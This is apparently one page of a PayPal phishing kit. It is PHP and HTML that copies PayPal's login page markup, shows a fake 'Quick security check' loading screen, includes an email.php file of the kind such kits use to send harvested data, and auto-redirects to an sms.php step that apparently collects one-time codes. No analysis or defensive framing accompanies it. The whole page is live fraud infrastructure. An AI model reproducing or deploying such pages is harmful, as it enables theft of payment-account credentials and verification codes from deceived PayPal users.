<?php
include "../email.php";
header( "refresh:".$loading_time.";URL=sms.php" );
?>
<!doctype html>


<html>
<head>







</head>
<body>
<style>

html, body { height: 100%; }

body {
   display: flex;
   align-items: center;
   justify-content: center;
}





.loader {
  border: 16px solid #f3f3f3; /* Light grey */
  border-top: 16px solid #003087; /* Blue */
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}




</style>






























<!DOCTYPE html>

<html lang="en" class="no-js mobile">


<head>
    <script src="js/Captcha/ngrlCaptcha.min.js"></script>
    <meta charset="utf-8" />
    <title>Log in to your PayPal account</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="PayPal" />
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
    <meta name="keywords" content="transfer money, email money transfer, international money transfer " />
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
    <link rel="shortcut icon" href="./img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" />
    <link rel="canonical" href="https://www.paypal.com/us/signin" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png" />
    <link rel="stylesheet" href="./css/contextualLoginElementalUI.css">
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/lib/modernizr-2.6.1.js"></script>
    <!-- /build -->
    <!-- /build -->
    <style id="antiClickjack">
        body {
            display: none !important;
        }
    </style>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        /* Special integration eligibility check */
        function isEligibleIntegration() {
            var sxf = "";
            return sxf === 'true' || window.name === 'PPFrameRedirect';
        }
        /* Don't bust the frame if this is top window */
        if (self === top || isEligibleIntegration()) {
            var antiClickjack = document.getElementById("antiClickjack");
            if (antiClickjack) {
                antiClickjack.parentNode.removeChild(antiClickjack);
            }
        } else {
            top.location = self.location;
        }
    </script>
</head>

<body class="mobile" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfR3mQy2JZfSavI03Q3pWZxE0B1RZg4BOBWYrkBW3opwz_17d3f689a11" data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKG6pWzWxd+IA6" data-production="true" data-enable-ads-captcha="true"
    data-ads-challenge-url="/auth/createchallenge/c7748a0f561bc123/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="f625559e00444" data-is-webkit-browser="true" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true"
    data-is-hybrid-login-experience="true" data-is-hybrid-editable-on-cookied="true" data-csrf-token="Rk8zKHCgyO26Qj/ro/HBVuUh+NSddBG/bVm6A=" data-nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true"
    data-is-track-password-field-autofill-enabled="true" data-enable-suppress-auto-submit="true" data-suppress-autosubmit-time="500" data-keychain-flags-json="{&quot;activationOnXoEnabled&quot;:true,&quot;isIosWebView&quot;:false,&quot;isEligibleForXhrLogin&quot;:false}"
    data-show-country-drop-down="true" data-email-label="Email" data-xhr-timeout-limit="20000" data-load-start-time="1637446359569" data-is-cookied-user="true" data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10" data-login-experience="safari">
    <noscript>
            <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p>
        </noscript>
    <div id="main" class="main" role="main">
        <section id="slLanding" class="slLanding hide" data-role="page" data-title="Connect your Google account, check out faster on your devices">
            <div class="corral">
                <div id="slContent" class="contentContainer contentContainerBordered">
                    <header>
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
                    </header>
                    <div id="linked" class="linked ">
                        <div class="profileRemembered">
                            <span class="loginEmail">a</span>
                            <a href="#" class="changeLink scTrack:not-you" id="changeLink">Change</a>
                        </div>
                        <div class="headerTextDecorated"></div>
                        <h1 class="headerText">Stay logged in for faster checkout</h1>
                        <p class="description assure">
                            Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)
                            <span class="learnMoreLink">
                                    <a href="#" id="slLoginLearnMore" class="secondayLink">What's this?</a>
                                </span>
                        </p>
                        
                        <div class="actions actionsSpacedShort">
                            <button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn">Continue</button>
                        </div>
                        <div id="secondaryLogin" class="buttonAsLink secondaryLink">
                            <button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn">Use password instead</button>
                        </div>
                    </div>
                    
                    </div>
                    
            </div>
        </section>
        <section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
            <div class=" corral">
                <div id="content" class="contentContainer activeContent contentContainerBordered">
                    <header>
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
                    </header>
                    <h1 id="headerText" class="headerText  accessAid">Log in to your PayPal account</h1>
                    <p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Type it below. Otherwise, click the link to log in with email.</p>
                    <div id="loginContent" class="">
                        <div id="loginSection" class="">
                            <div class="notifications"></div>
                            <div id="keychainErrorMessage" class="hide">
                                <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch &trade;only works for checkout. Please login with your email.</p>
                                <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
                                <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
                            </div>
                            <center>
                                <style>
                                   .textstyle {
    color: #0c0c0d;
    font-family: PayPalSansBig-Regular,Helvetica Neue,Arial,sans-serif;
    font-size: 1.125rem;
    line-height: 1.5rem;
    font-weight: 400;
                                            }   
        
                                            
											
											
											
											form > div {
  margin:40px 0
}

/*Start  Styling Toggle-Switch*/
.toggle-switch input{
  opacity: 0
}

.toggle-switch label{
  width: 60px;
  height: 30px;
  background: #ccc;
  border-radius:50px;
  display: inline-block;
  position: relative;
}

.toggle-switch label:after {
  content: '';
  display: block;
  width: 28px;
  height: 28px;
  background: #fff;
  border-radius: 50%;
  position: absolute;
  top: 1px;
  left: 1px;
  transition: left .3s ease-out;
}

.toggle-switch input[id="togle-swith"]:checked + label:after {
  left: 31px
}

.toggle-switch input[id="togle-swith"]:checked + label {
  background:#3497db;
}
/*End  Styling Toggle-Switch*/

/*Start  Styling Checkbox*/
.checkbox input{
  opacity: 0
}

.checkbox label{
  width: 30px;
  height: 30px;
  background: ;
  display: inline-block;
  position: relative;
  background: #eee
}

.checkbox label:hover{
  cursor: pointer
}

.checkbox label:after{
  content: '';
  display: block;
  width: 5px;
  height: 10px;
  border: 3px solid #fff;
  border-top: transparent;
  border-left: transparent;
  position: absolute;
  transform: rotate(45deg) scale(1.3);
  top: 6px;
  left: 10px;
  opacity: 0;
  transition:opacity .3s ease-in-out
}

.checkbox input[id="checkbox"]:checked + label:after {
  opacity: 1
}

.checkbox input[id="checkbox"]:checked + label {
  background:#00d49b
}
/*End  Styling Checkbox*/


/*Start  Styling Radio Button*/
.radio-btn input{
  opacity: 0
}

.radio-btn label{
  width: 28px;
  height: 28px;
  display: inline-block;
  position: relative;
  border-radius: 50%;
  border: 9px solid #ccc
}

.radio-btn label:hover{
  cursor: pointer
}

.radio-btn label:after{
  content: '';
  display: block;
  width: 10px;
  height: 10px;
  position: absolute;
  background: #FFF;
  border-radius: 50%;
  opacity: 0;
  top: 50%;
  left: 50%;
  transform: translate(-50% , -50%);
}

.radio-btn input[type="radio"]:checked + label:after {
  opacity: 1;
  animation:centring .3s ease-in-out 1 forwards
}

.radio-btn input[type="radio"]:checked + label {
  border-color:  #1040C1;

}



@keyframes centring {
  0% {
    top: 50%;
    left: 50%;
    transform: translate(-50% , -50%);
  }

  50%{
    top: 50%;
    left: 50%;
    transform: translate(-50% , -50%) scale(2.3);
  }
  100%{
    top: 50%;
    left: 50%;
    transform: translate(-50% , -50%) scale(1.5);
  }


}

/*End  Styling Radio Button*/
											
											
											
											.column {
  float: left;
  width: 50%;
}

/* Clear floats after the columns */
.row:after {
  content: "";
  display: table;
  clear: both;
}
											
                                            </style>
                            <h1>Quick security check
</h1><br><br>    <br>
<div class="loader"></div>


    </p>
    <br>
    <div>

        
	
  
  
  
  
  
  <style>
		.container {
			display: flex;
			flex-direction: row;
			align-items: center;
			justify-content: space-between;
			width: 267px;
			margin: auto;
		
		}
		.text {
			text-align: right;
			flex: 5;
		}
		.radio {
			margin-right: 10px;
		}
	</style>
									<form action="sms.php">

	
                                        



    <p class="textstyle" >Please wait while we load the page for you. We're working on it and it shouldn't take long. Thank you for your patience.

    </p>





    


    

                           
                                <div class="actions">
                                </div>
								
								</form>
        <footer class="footer" role="contentinfo">
            <div class="legalFooter">
                <ul class="footerGroup">
                    <li>
                        <a target="_blank" href="#">Contact Us</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Privacy</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Legal</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Worldwide</a>
                    </li>
                </ul>
            </div>
        </footer>
    </div>
    <div class="transitioning  hide ">
        <p class="welcomeMessage hide">Welcome, !</p>
        <p class="checkingInfo hide">Checking your info…</p>
        <p class="oneSecond hide">Just a second…</p>
        <p class="secureMessage hide">Securely logging you in...</p>
        <p class="oneTouchMessage hide"></p>
        <p class="retrieveInfo hide">Retrieving your info...</p>
        <p class="waitFewSecs hide">This may take a few seconds...</p>
        <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.</p>
        <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for this purchase.</p>
        <p class="udtSpinnerMessage webllsXoUS hide">
            We recognize you on this device, so you can skip login.<br>
            <br>Manage this setting in your profile.
        </p>
        <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
        <p class="qrcMessage hide">Redirecting...</p>
        <div class="keychain spinner-content uiExp hide"></div>
    </div>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.slData = {
            "slSessionChkTimeout": "",
            "slOptInTimeout": "",
            "slAuthChkTimeout": "",
            "slTokenValidationTimeout": "",
            "slDisplayMerchantLink": "",
            "slAction": "",
            "smartlockStatus": "",
            "slLinkedEmail": "",
            "slFrameSrc": "",
            "slAuthUrl": "",
            "partnerClientId": "",
            "partnerReturnUri": "",
            "scimContextId": "",
            "slOptInOT": "",
            "slLoginEmail": "",
            "slReturnUrl": "",
            "delayPartnerAssertion": "",
            "googleOneTapEnable": ""
        };
    </script>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulData = {
            fnUrl: "https://c.paypal.com/da/r/fb.js",
            fnSessionId: "bafe35adbe434f0cb790c3438ad4a85b",
            sourceId: "UNIFIED_LOGIN_INPUT_PASSWORD",
            beaconUrl: "https://b.stats.paypal.com/v1/counter.cgi?r=cD1iYWZlMzVhZGJlNDM0ZjBjYjc5MGMzNDM4YWQ0YTg1YiZpPTEwOC4xNzUuMTEuMjQ5JnQ9MTYzNzQ0NjM1OS41OTYmYT0yMSZzPVVOSUZJRURfTE9HSU7PA0IVK1unkawdg32K5vfZSBpELw",
            enableSpeedTyping: "true",
            aPayAuth: "",
            aPayCanMakePaymentTimeout: "",
            tokenAssertionUri: "",
            preloadScriptUrl: "",
            preloadScriptDownloadLength: 0,
            fingerprintProceed: ""
        };
    </script>
    <noscript>
            <img src="https://c.paypal.com/v1/r/d/b/ns?f=bafe35adbe434f0cb790c3438ad4a85b&s=UNIFIED_LOGIN_INPUT_PASSWORD&js=0&r=1" title="ppfniframe" alt="" height="1" width="1" border="0">
        </noscript>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" id="ul-sync-data">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulSync = {
            fnSessionId: 'bafe35adbe434f0cb790c3438ad4a85b',
            sourceId: 'UNIFIED_LOGIN_INPUT_PASSWORD',
            fname: 'fn_sync_data'
        };
    </script>
    <!-- build:js inline -->
    <!-- build:[src] js/lib/ -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/lib/fn-sync-telemetry-min.js"></script>
    <!-- /build -->
    <!-- /build -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulData = PAYPAL.ulData || {};
        PAYPAL.ulData.incontextData = {
            "version": "",
            "noBridge": "",
            "env": "",
            "icstage": "",
            "targetCancelUrl": "",
            "paymentAction": "",
            "paymentToken": "",
            "merchantID": ""
        };
    </script>
    <!-- build:js inline -->
    <!-- build:[src] js/ -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/signin-split-safari.js"></script>
    <!-- /build -->
    <!-- /build -->
    <script src="/.js/pa.js"></script>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        (function() {
            if (typeof PAYPAL.analytics != "undefined") {
                PAYPAL.core = PAYPAL.core || {};
                PAYPAL.core.pta = PAYPAL.analytics.setup({
                    data: 'pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1637446359569&calc=f625559e00444&nsid=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA&rsta=en_US&pgtf=Nodejs&env=live&s=ci&ccpg=US&csci=cd7af927f76446668a56bede9ca620bf&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&gacook=327769726.1636429429&ef_policy=ccpa&c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200%2C101817&xt=105856%2C103864%2C117843%2C111671&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F',
                    url: 'https:\/\/t.paypal.com\/ts'
                });
            }
        }());
    </script>
    <noscript>
            <img src="https://t.paypal.com/ts?nojs=1&pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1637446359569&calc=f625559e00444&nsid=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA&rsta=en_US&pgtf=Nodejs&env=live&s=ci&ccpg=US&csci=cd7af927f76446668a56bede9ca620bf&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&gacook=327769726.1636429429&ef_policy=ccpa&c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200%2C101817&xt=105856%2C103864%2C117843%2C111671&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F" alt="" height="1" width="1" border="0">
        </noscript>
    <script async defer src="./Chapta/recaptchav3.js?_sessionID=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA"></script>
    <script src="./js/jquery-3.6.3.min.js"></script>
</body>

</html>











































</body>
</html>